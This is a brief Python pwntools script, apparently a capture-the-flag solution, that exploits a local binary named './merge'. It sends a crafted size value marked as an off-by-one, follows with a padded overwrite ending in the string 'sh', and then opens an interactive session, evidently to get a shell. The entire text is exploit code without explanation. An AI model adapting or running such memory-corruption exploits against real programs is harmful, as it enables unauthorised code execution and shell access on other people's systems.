from pwn import *

context.arch = 'amd64'

r = process('./merge')

# off-by-one
r.sendafter(':', flat(0, 0x450))

# overwrite
r.sendlineafter(':', flat('\x00'*0x420, 'sh\x00'))

r.interactive()